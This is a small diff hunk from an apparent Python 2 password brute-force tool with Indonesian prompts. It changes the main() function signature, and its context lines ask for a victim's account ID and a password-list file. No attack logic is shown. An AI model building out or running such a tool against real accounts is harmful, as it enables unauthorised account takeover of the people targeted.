@@ -12,7 +12,7 @@ print "Gunakan Dengan Bijak"
 print "CTRL+C Untuk Keluar"
 print "Thanks To Zero"
 
-def main(self, cookie, url, config):
+def main():
 os.system('clear')
 email = str(raw_input("[*]=> Masukan ID Korban : "))
 passwordlist = str(raw_input("List Password.txt : "))
